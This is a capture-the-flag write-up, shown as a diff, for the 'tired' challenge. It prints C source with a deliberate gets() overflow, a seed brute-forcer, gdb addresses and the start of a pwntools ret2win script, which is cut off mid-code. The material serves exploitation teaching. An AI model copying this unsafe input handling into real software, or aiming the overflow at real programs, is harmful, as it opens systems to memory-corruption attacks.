@@ -1,0 +1,333 @@
+<p>For this problem, we’re given a <code>tired.c</code> file as well as a corresponding <code>tired</code> executubale. The <code>tired.c</code> looks like this:</p>
+<div class="sourceCode" id="cb1"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb1-1"><a href="#cb1-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb1-2"><a href="#cb1-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
+<span id="cb1-3"><a href="#cb1-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
+<span id="cb1-4"><a href="#cb1-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;time.h&gt;</span></span>
+<span id="cb1-5"><a href="#cb1-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-6"><a href="#cb1-6" aria-hidden="true" tabindex="-1"></a><span class="pp">#define SLEEP 1</span></span>
+<span id="cb1-7"><a href="#cb1-7" aria-hidden="true" tabindex="-1"></a><span class="pp">#define YOUTUBE 2</span></span>
+<span id="cb1-8"><a href="#cb1-8" aria-hidden="true" tabindex="-1"></a><span class="pp">#define WALK_PET 3</span></span>
+<span id="cb1-9"><a href="#cb1-9" aria-hidden="true" tabindex="-1"></a><span class="pp">#define LECTURE 4</span></span>
+<span id="cb1-10"><a href="#cb1-10" aria-hidden="true" tabindex="-1"></a><span class="pp">#define SPICY_MOVE 5</span></span>
+<span id="cb1-11"><a href="#cb1-11" aria-hidden="true" tabindex="-1"></a><span class="pp">#define PLANT_SEED 6</span></span>
+<span id="cb1-12"><a href="#cb1-12" aria-hidden="true" tabindex="-1"></a><span class="pp">#define OTHER 7</span></span>
+<span id="cb1-13"><a href="#cb1-13" aria-hidden="true" tabindex="-1"></a><span class="pp">#define FINISH 8</span></span>
+<span id="cb1-14"><a href="#cb1-14" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-15"><a href="#cb1-15" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> seed<span class="op">;</span></span>
+<span id="cb1-16"><a href="#cb1-16" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-17"><a href="#cb1-17" aria-hidden="true" tabindex="-1"></a><span class="co">// xkcd 221</span></span>
+<span id="cb1-18"><a href="#cb1-18" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> getRandomNumber<span class="op">()</span> <span class="op">{</span></span>
+<span id="cb1-19"><a href="#cb1-19" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-20"><a href="#cb1-20" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">6</span><span class="op">;</span>   <span class="co">// chosen by fair dice roll</span></span>
+<span id="cb1-21"><a href="#cb1-21" aria-hidden="true" tabindex="-1"></a>                <span class="co">// guaranteed to be random</span></span>
+<span id="cb1-22"><a href="#cb1-22" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb1-23"><a href="#cb1-23" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-24"><a href="#cb1-24" aria-hidden="true" tabindex="-1"></a><span class="co">// User should never eva get here</span></span>
+<span id="cb1-25"><a href="#cb1-25" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> unreachable<span class="op">()</span> <span class="op">{</span></span>
+<span id="cb1-26"><a href="#cb1-26" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-27"><a href="#cb1-27" aria-hidden="true" tabindex="-1"></a>    <span class="co">// 😅</span></span>
+<span id="cb1-28"><a href="#cb1-28" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;If you&#39;re seeing this, the code is in what I thought was an unreachable state.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-29"><a href="#cb1-29" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;I could give you advice for what to do. But honestly, why should you trust me?</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-30"><a href="#cb1-30" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;I clearly screwed this up. I&#39;m writing a message that should never appear, yet I know it will probably appear someday.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-31"><a href="#cb1-31" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;On a deep level, I know I&#39;m not up to this task. [of keeping secrets]</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-32"><a href="#cb1-32" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-33"><a href="#cb1-33" aria-hidden="true" tabindex="-1"></a>    <span class="co">// print(&quot;Something Happens Here. 👀&quot;)</span></span>
+<span id="cb1-34"><a href="#cb1-34" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-35"><a href="#cb1-35" aria-hidden="true" tabindex="-1"></a>    exit<span class="op">(</span><span class="dv">0</span><span class="op">);</span></span>
+<span id="cb1-36"><a href="#cb1-36" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb1-37"><a href="#cb1-37" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-38"><a href="#cb1-38" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> makeMoves<span class="op">(</span><span class="dt">void</span><span class="op">){</span></span>
+<span id="cb1-39"><a href="#cb1-39" aria-hidden="true" tabindex="-1"></a>    <span class="co">// I am very tired and for some reason writing this program. But, TRUST ME there are no issues with this program.</span></span>
+<span id="cb1-40"><a href="#cb1-40" aria-hidden="true" tabindex="-1"></a>    <span class="co">// I am so confident, I&#39;m sharing this code with the best heckers @ UNSW</span></span>
+<span id="cb1-41"><a href="#cb1-41" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-42"><a href="#cb1-42" aria-hidden="true" tabindex="-1"></a>    printf<span class="op">(</span><span class="st">&quot;The AMAZING &#39;What Should I Do Generator&#39;, for tired people who don&#39;t want to think what they should be doing.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-43"><a href="#cb1-43" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-44"><a href="#cb1-44" aria-hidden="true" tabindex="-1"></a>    <span class="cf">while</span> <span class="op">(</span><span class="dv">1</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb1-45"><a href="#cb1-45" aria-hidden="true" tabindex="-1"></a>        <span class="dt">time_t</span> now <span class="op">=</span> time<span class="op">(&amp;</span>now<span class="op">);</span></span>
+<span id="cb1-46"><a href="#cb1-46" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-47"><a href="#cb1-47" aria-hidden="true" tabindex="-1"></a>        <span class="co">// printf(&quot;It&#39;s midnight! What should I do?\n&quot;);</span></span>
+<span id="cb1-48"><a href="#cb1-48" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;</span><span class="sc">\n</span><span class="st">It&#39;s %s&quot;</span><span class="op">,</span> ctime<span class="op">(&amp;</span>now<span class="op">));</span></span>
+<span id="cb1-49"><a href="#cb1-49" aria-hidden="true" tabindex="-1"></a>        printf<span class="op">(</span><span class="st">&quot;What should I do?</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-50"><a href="#cb1-50" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-51"><a href="#cb1-51" aria-hidden="true" tabindex="-1"></a>        <span class="dt">char</span> task<span class="op">[</span><span class="dv">32</span><span class="op">];</span></span>
+<span id="cb1-52"><a href="#cb1-52" aria-hidden="true" tabindex="-1"></a>        <span class="dt">int</span> move<span class="op">;</span></span>
+<span id="cb1-53"><a href="#cb1-53" aria-hidden="true" tabindex="-1"></a>        scanf<span class="op">(</span><span class="st">&quot;%d&quot;</span><span class="op">,</span> <span class="op">&amp;</span>move<span class="op">);</span></span>
+<span id="cb1-54"><a href="#cb1-54" aria-hidden="true" tabindex="-1"></a>        getchar<span class="op">();</span></span>
+<span id="cb1-55"><a href="#cb1-55" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-56"><a href="#cb1-56" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>move <span class="op">==</span> SLEEP<span class="op">)</span> <span class="op">{</span> <span class="co">/* 1 */</span></span>
+<span id="cb1-57"><a href="#cb1-57" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;Uhhh... Okay :( (Sleep is deffo important)</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-58"><a href="#cb1-58" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;Wow so glad I have this machine to tell me to sleep!</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-59"><a href="#cb1-59" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>move <span class="op">==</span> YOUTUBE<span class="op">)</span> <span class="op">{</span> <span class="co">/* 2 */</span></span>
+<span id="cb1-60"><a href="#cb1-60" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;Watch this now! I dare you!</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-61"><a href="#cb1-61" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;https://www.youtube.com/watch?v=dQw4w9WgXcQ&amp;ab</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-62"><a href="#cb1-62" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>move <span class="op">==</span> WALK_PET<span class="op">)</span> <span class="op">{</span> <span class="co">/* 3 */</span></span>
+<span id="cb1-63"><a href="#cb1-63" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;I can take my goldfish on a walk?</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-64"><a href="#cb1-64" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>move <span class="op">==</span> LECTURE<span class="op">)</span> <span class="op">{</span> <span class="co">/* 4 */</span></span>
+<span id="cb1-65"><a href="#cb1-65" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;A Buckland Lecture? Of course!</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-66"><a href="#cb1-66" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>move <span class="op">==</span> SPICY_MOVE<span class="op">)</span> <span class="op">{</span> <span class="co">/* 5 */</span></span>
+<span id="cb1-67"><a href="#cb1-67" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;Playing chess and make an absolute blunder after moving? Tell your opponent you are trying something spicy...</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-68"><a href="#cb1-68" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;Hopefully he believes you.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-69"><a href="#cb1-69" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>move <span class="op">==</span> PLANT_SEED<span class="op">)</span> <span class="op">{</span> <span class="co">/* 6 */</span></span>
+<span id="cb1-70"><a href="#cb1-70" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;Can&#39;t plant a tree here, but I&#39;ll let you plant a different type of seed</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-71"><a href="#cb1-71" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;What is your lucky number?</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-72"><a href="#cb1-72" aria-hidden="true" tabindex="-1"></a>            scanf<span class="op">(</span><span class="st">&quot;%d&quot;</span><span class="op">,</span> <span class="op">&amp;</span>seed<span class="op">);</span></span>
+<span id="cb1-73"><a href="#cb1-73" aria-hidden="true" tabindex="-1"></a>            getchar<span class="op">();</span></span>
+<span id="cb1-74"><a href="#cb1-74" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>move <span class="op">==</span> OTHER<span class="op">)</span> <span class="op">{</span> <span class="co">/* 7 */</span></span>
+<span id="cb1-75"><a href="#cb1-75" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-76"><a href="#cb1-76" aria-hidden="true" tabindex="-1"></a>            <span class="cf">if</span> <span class="op">(</span>seed<span class="op">)</span> <span class="op">{</span></span>
+<span id="cb1-77"><a href="#cb1-77" aria-hidden="true" tabindex="-1"></a>                srand<span class="op">(</span>seed<span class="op">);</span></span>
+<span id="cb1-78"><a href="#cb1-78" aria-hidden="true" tabindex="-1"></a>                <span class="cf">if</span> <span class="op">(</span>rand<span class="op">()</span> <span class="op">%</span> <span class="dv">13333337</span> <span class="op">==</span> getRandomNumber<span class="op">())</span> <span class="op">{</span></span>
+<span id="cb1-79"><a href="#cb1-79" aria-hidden="true" tabindex="-1"></a>                    printf<span class="op">(</span><span class="st">&quot;Lucky number 6!</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-80"><a href="#cb1-80" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb1-81"><a href="#cb1-81" aria-hidden="true" tabindex="-1"></a>                    printf<span class="op">(</span><span class="st">&quot;Luck wasn&#39;t on your side. You don&#39;t get to choose!</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-82"><a href="#cb1-82" aria-hidden="true" tabindex="-1"></a>                    exit<span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
+<span id="cb1-83"><a href="#cb1-83" aria-hidden="true" tabindex="-1"></a>                <span class="op">}</span></span>
+<span id="cb1-84"><a href="#cb1-84" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span> <span class="cf">else</span> <span class="op">{</span></span>
+<span id="cb1-85"><a href="#cb1-85" aria-hidden="true" tabindex="-1"></a>                printf<span class="op">(</span><span class="st">&quot;Ever thought of planting a tree?</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-86"><a href="#cb1-86" aria-hidden="true" tabindex="-1"></a>                exit<span class="op">(</span><span class="dv">1</span><span class="op">);</span></span>
+<span id="cb1-87"><a href="#cb1-87" aria-hidden="true" tabindex="-1"></a>            <span class="op">}</span></span>
+<span id="cb1-88"><a href="#cb1-88" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-89"><a href="#cb1-89" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;Uhh... Okay, let&#39;s hear your &#39;great&#39; idea... :/</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-90"><a href="#cb1-90" aria-hidden="true" tabindex="-1"></a>            gets<span class="op">(&amp;</span>task<span class="op">);</span></span>
+<span id="cb1-91"><a href="#cb1-91" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;%s sounds like a &#39;great&#39; idea... why did you need me?</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> <span class="op">&amp;</span>task<span class="op">);</span></span>
+<span id="cb1-92"><a href="#cb1-92" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span> <span class="cf">else</span> <span class="cf">if</span> <span class="op">(</span>move <span class="op">==</span> FINISH<span class="op">)</span> <span class="op">{</span> <span class="co">/* 8 */</span></span>
+<span id="cb1-93"><a href="#cb1-93" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;BYE!</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-94"><a href="#cb1-94" aria-hidden="true" tabindex="-1"></a>            <span class="cf">break</span><span class="op">;</span></span>
+<span id="cb1-95"><a href="#cb1-95" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb1-96"><a href="#cb1-96" aria-hidden="true" tabindex="-1"></a>        <span class="cf">else</span> <span class="op">{</span> <span class="co">/* ![1-8] */</span></span>
+<span id="cb1-97"><a href="#cb1-97" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;I was thinking of nothing but `xkcd 2200` writing this program.</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-98"><a href="#cb1-98" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;If you&#39;re seeing this, the code is in what I thought was a reachable state. Please check that you have made a valid move. I clearly screwed this up. I should make this program more user friendly!</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb1-99"><a href="#cb1-99" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb1-100"><a href="#cb1-100" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb1-101"><a href="#cb1-101" aria-hidden="true" tabindex="-1"></a>    <span class="cf">return</span> <span class="dv">0</span><span class="op">;</span></span>
+<span id="cb1-102"><a href="#cb1-102" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span>
+<span id="cb1-103"><a href="#cb1-103" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-104"><a href="#cb1-104" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main<span class="op">(</span><span class="dt">void</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb1-105"><a href="#cb1-105" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-106"><a href="#cb1-106" aria-hidden="true" tabindex="-1"></a>    setbuf<span class="op">(</span>stdin<span class="op">,</span> NULL<span class="op">);</span></span>
+<span id="cb1-107"><a href="#cb1-107" aria-hidden="true" tabindex="-1"></a>    setbuf<span class="op">(</span>stdout<span class="op">,</span> NULL<span class="op">);</span></span>
+<span id="cb1-108"><a href="#cb1-108" aria-hidden="true" tabindex="-1"></a>    makeMoves<span class="op">();</span></span>
+<span id="cb1-109"><a href="#cb1-109" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb1-110"><a href="#cb1-110" aria-hidden="true" tabindex="-1"></a>    exit<span class="op">(</span><span class="dv">0</span><span class="op">);</span></span>
+<span id="cb1-111"><a href="#cb1-111" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>It’s alot to digest, but let’s go through it step by step. We start out in main, where we call <code>makeMoves()</code>. <code>In makeMoves()</code>, we’re given the option to enter in a move, which can be a number from 1 to 8. For each number we enter, the program will print out a different message or do something different, and then ask for your next move. There’s also another function called <code>unreachable()</code> which seems pretty suspicious. There’s a good a chance that if we manage to call it, we’ll be able to get our flag!</p>
+<p>So how do we manage to call a function that is never called in <code>tired.c</code>? Well there are two approaches: buffer overflow and gdb. Buffer overflow seems like the intended solution, so let’s explore that first.</p>
+<h2 id="approach-1-buffer-overflow">Approach 1: Buffer Overflow</h2>
+<p>So many of the moves that we make just do printf, so they’re not super useful. However, there are two that stand out. When we enter in 7 (OTHER), we will go through a set of if statements. If the seed is non-zero, and a random number generated from the seed is equal to the output of <code>getRandomNumber()</code> modulo 13,333,337, then the code does not exit and proceeds to ask us for a “great” idea. Note that <code>getRandomNumber()</code> always returns 6, as a nod to a xkcd 221. If we are able to get this buffer overflow, then we can start writing to the stack, which means that we can replace the return address for the function call to <code>makeMoves()</code> with the address of unreachable!</p>
+<p>But how do we get our random number to be equal to 6 modulo 13,333,337? Well, turns out we can write a script to bruteforce values for us. In theory, we should only need at most 13,333,337 different possible starting seeds before we find one that works, which is certainly doable by computers. Hence, we can write up a script that looks like this to brute force for us:</p>
+<div class="sourceCode" id="cb2"><pre class="sourceCode c"><code class="sourceCode c"><span id="cb2-1"><a href="#cb2-1" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdio.h&gt;</span></span>
+<span id="cb2-2"><a href="#cb2-2" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;stdlib.h&gt;</span></span>
+<span id="cb2-3"><a href="#cb2-3" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;string.h&gt;</span></span>
+<span id="cb2-4"><a href="#cb2-4" aria-hidden="true" tabindex="-1"></a><span class="pp">#include </span><span class="im">&lt;time.h&gt;</span></span>
+<span id="cb2-5"><a href="#cb2-5" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb2-6"><a href="#cb2-6" aria-hidden="true" tabindex="-1"></a><span class="dt">int</span> main <span class="op">()</span> <span class="op">{</span></span>
+<span id="cb2-7"><a href="#cb2-7" aria-hidden="true" tabindex="-1"></a>    <span class="cf">for</span> <span class="op">(</span><span class="dt">int</span> i <span class="op">=</span> <span class="dv">1</span><span class="op">;</span> i <span class="op">&lt;=</span> <span class="dv">13333337</span><span class="op">;</span> i<span class="op">++)</span> <span class="op">{</span></span>
+<span id="cb2-8"><a href="#cb2-8" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>i <span class="op">%</span> <span class="dv">1000</span> <span class="op">==</span> <span class="dv">0</span><span class="op">)</span> printf<span class="op">(</span><span class="st">&quot;%d</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> i<span class="op">);</span></span>
+<span id="cb2-9"><a href="#cb2-9" aria-hidden="true" tabindex="-1"></a>        srand<span class="op">(</span>i<span class="op">);</span></span>
+<span id="cb2-10"><a href="#cb2-10" aria-hidden="true" tabindex="-1"></a>        <span class="cf">if</span> <span class="op">(</span>rand<span class="op">()</span> <span class="op">%</span> <span class="dv">13333337</span> <span class="op">==</span> <span class="dv">6</span><span class="op">)</span> <span class="op">{</span></span>
+<span id="cb2-11"><a href="#cb2-11" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;found!</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">);</span></span>
+<span id="cb2-12"><a href="#cb2-12" aria-hidden="true" tabindex="-1"></a>            printf<span class="op">(</span><span class="st">&quot;i: %d</span><span class="sc">\n</span><span class="st">&quot;</span><span class="op">,</span> i<span class="op">);</span></span>
+<span id="cb2-13"><a href="#cb2-13" aria-hidden="true" tabindex="-1"></a>            <span class="cf">break</span><span class="op">;</span></span>
+<span id="cb2-14"><a href="#cb2-14" aria-hidden="true" tabindex="-1"></a>        <span class="op">}</span></span>
+<span id="cb2-15"><a href="#cb2-15" aria-hidden="true" tabindex="-1"></a>    <span class="op">}</span></span>
+<span id="cb2-16"><a href="#cb2-16" aria-hidden="true" tabindex="-1"></a><span class="op">}</span></span></code></pre></div>
+<p>Running this script, we eventually settle on the seed 5703817 after about 10 seconds. Testing this on the tired script, we get:</p>
+<div class="sourceCode">
+<pre class="sourceCode term"><code class="sourceCode term"><span><span class="ex">$</span> ./tired
+</span><span>The AMAZING 'What Should I Do Generator', for tired people who don't want to think what they should be doing.
+</span><span>
+</span><span>It's Mon Apr 11 06:11:32 2022
+</span><span>What should I do?
+</span><span>6
+</span><span>Can't plant a tree here, but I'll let you plant a different type of seed
+</span><span>What is your lucky number?
+</span><span>5703817
+</span><span>
+</span><span>It's Mon Apr 11 06:11:39 2022
+</span><span>What should I do?
+</span><span>7
+</span><span>Lucky number 6!
+</span><span>Uhh... Okay, let's hear your 'great' idea... :/
+</span><span>
+</span></code></pre>
+</div>
+<p>In other words, it worked! Now it’s also completely possible that our own brute force script uses a slightly different <code>rand()</code> library implementation than the one used in <code>./tired</code>, meaning that the seed is different. If that were the case, then we would probably have had to use pwntools to interact with the script itself, and manually enter in seeds until we eventually pass the check. I imagine this would be a bit slower though, due to the extra overhead of connecting to the process and printing out all the flavour text.</p>
+<p>Anyway, now all we need to do is set up our buffer overflow. First we need the address of <code>unreachable()</code> so first what we’ll do is we’ll use gdb to check the function locations. Running <code>info functions()</code> gives us:</p>
+<div class="sourceCode">
+<pre class="sourceCode term"><code class="sourceCode term"><span><span class="ex">$</span> gdb ./tired
+</span><span>GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2
+</span><span>Copyright (C) 2020 Free Software Foundation, Inc.
+</span><span>License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
+</span><span>This is free software: you are free to change and redistribute it.
+</span><span>There is NO WARRANTY, to the extent permitted by law.
+</span><span>Type "show copying" and "show warranty" for details.
+</span><span>This GDB was configured as "x86_64-linux-gnu".
+</span><span>Type "show configuration" for configuration details.
+</span><span>For bug reporting instructions, please see:
+</span><span><http://www.gnu.org/software/gdb/bugs/>.
+</span><span>Find the GDB manual and other documentation resources online at:
+</span><span>    <http://www.gnu.org/software/gdb/documentation/>.
+</span><span>
+</span><span>For help, type "help".
+</span><span>Type "apropos word" to search for commands related to "word"...
+</span><span>Reading symbols from ./tired...
+</span><span>(No debugging symbols found in ./tired)
+</span><span>(gdb) info functions
+</span><span>All defined functions:
+</span><span>
+</span><span>Non-debugging symbols:
+</span><span>0x08049000  _init
+</span><span>0x08049030  setbuf@plt
+</span><span>0x08049040  printf@plt
+</span><span>0x08049050  gets@plt
+</span><span>0x08049060  getchar@plt
+</span><span>0x08049070  time@plt
+</span><span>0x08049080  ctime@plt
+</span><span>0x08049090  puts@plt
+</span><span>0x080490a0  exit@plt
+</span><span>0x080490b0  srand@plt
+</span><span>0x080490c0  strlen@plt
+</span><span>0x080490d0  __libc_start_main@plt
+</span><span>0x080490e0  rand@plt
+</span><span>0x080490f0  __isoc99_scanf@plt
+</span><span>0x08049100  _start
+</span><span>0x08049140  _dl_relocate_static_pie
+</span><span>0x08049150  __x86.get_pc_thunk.bx
+</span><span>0x08049160  deregister_tm_clones
+</span><span>0x080491a0  register_tm_clones
+</span><span>0x080491e0  __do_global_dtors_aux
+</span><span>0x08049210  frame_dummy
+</span><span>--Type <RET> for more, q to quit, c to continue without paging--
+</span><span>0x08049212  getRandomNumber
+</span><span>0x08049226  unreachable
+</span><span>0x080493cd  makeMoves
+</span><span>0x080496a9  main
+</span><span>0x080496fe  __x86.get_pc_thunk.ax
+</span><span>0x08049710  __libc_csu_init
+</span><span>0x08049770  __libc_csu_fini
+</span><span>0x08049774  _fini
+</span><span>(gdb)
+</span></code></pre>
+</div>
+<p>As we can see, unreachable is positioned at address <code>0x08049226</code>. To do the buffer overflow, we will start by writing a bunch of A’s to overflow the buffer. Then, after writing the exact amount so that we reach the point where the return address is stored, we will print out the address in reverse order (<code>b"\x26\x92\x04\x08\x01"</code>) in order to replace it. Note the reverse order, since the executable deals in little endian. Finally, we will enter a move of 8 in order to exit from <code>makeMoves()</code> and get to <code>unreachable()</code>.</p>
+<p>In order to work out exactly how many A’s to write, we can either examine the stack in gdb in order to calcualte the exact amount, or write a script to brute force every number of A’s. For some reason, the stack method wasn’t giving me accurate results, so I resorted to the brute force instead. Here’s the script that I used:</p>
+<div class="sourceCode" id="cb3"><pre class="sourceCode python"><code class="sourceCode python"><span id="cb3-1"><a href="#cb3-1" aria-hidden="true" tabindex="-1"></a><span class="im">from</span> pwn <span class="im">import</span> <span class="op">*</span></span>
+<span id="cb3-2"><a href="#cb3-2" aria-hidden="true" tabindex="-1"></a><span class="im">import</span> time</span>
+<span id="cb3-3"><a href="#cb3-3" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-4"><a href="#cb3-4" aria-hidden="true" tabindex="-1"></a><span class="cf">for</span> i <span class="kw">in</span> <span class="bu">range</span>(<span class="dv">32</span>, <span class="dv">100</span>, <span class="dv">4</span>):</span>
+<span id="cb3-5"><a href="#cb3-5" aria-hidden="true" tabindex="-1"></a>    <span class="bu">print</span>(i)</span>
+<span id="cb3-6"><a href="#cb3-6" aria-hidden="true" tabindex="-1"></a>    p <span class="op">=</span> process(<span class="st">&quot;./tired&quot;</span>)</span>
+<span id="cb3-7"><a href="#cb3-7" aria-hidden="true" tabindex="-1"></a></span>
+<span id="cb3-8"><a href="#cb3-8" aria-hidden="true" tabindex="-1"></a>    <span class="co"># set the correct seed</span></span>
+<span id="cb3-9"><a href="#cb3-9" aria-hidden="true" tabindex="-1"></a>    p.recvuntil(<span class="st">b&quot;What should I do?</span><span class="ch">\n</span><span class="st">&quot;</span>)</span>
+<span id="cb3-10"><a href="#cb3-10" aria-hidden="true" tabindex="-1"></a>    p.sendline(<span class="st">b&quot;6&quot;</span>)</span>
+<span id="cb3-11"><a href="#cb3-11" aria-hidden="true" tabindex="-1"></a>    p.recvuntil(<span class="st">b&quot;What is your lucky number?</span><span class="ch">\n</span><span class="st">&quot;</span>)</span>
+<span id="cb3-12"><a href="#cb3-12" aria-hidden="true" tabindex="-1"></a>    p.sendline(<span class="st">b&quot;5703817&quot;</span>)</span>
+<span id="cb3-13"><a href="#cb3-13" aria-hidden="true" tabindex="-1"></a>    p.recvuntil(<span class="st">b&quot;What should I do?</span><span class="ch">\n</span><span class="st">&quot;</span>)</span>
